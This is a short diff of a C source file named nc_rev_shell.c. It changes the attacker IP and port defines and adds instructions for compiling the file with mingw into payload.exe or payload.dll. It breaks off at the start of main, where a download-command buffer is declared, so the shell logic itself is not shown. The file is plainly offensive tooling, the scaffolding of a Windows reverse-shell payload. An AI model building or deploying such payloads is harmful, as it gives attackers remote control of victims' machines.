@@ -1,10 +1,14 @@
 #include <stdlib.h>
 #include <stdio.h>
 
-#define ATTACKER_IP "192.168.45.152"
-#define ATTACKER_PORT "443"
+#define ATTACKER_IP "192.168.0.0"
+#define ATTACKER_PORT "6969"
 
-// Note: Compile with x86_64-w64-mingw32-gcc nc_rev_shell.c -o payload.exe
+/*
+* COMPILATION INSTRUCTIONS
+* For EXE file: x86_64-w64-mingw32-gcc nc_rev_shell.c -o payload.exe
+* For DLL file: x86_64-w64-mingw32-gcc -shared -o payload.dll nc_rev_shell.c
+*/
 
 int main(void) {
     char downloadCmd[512];
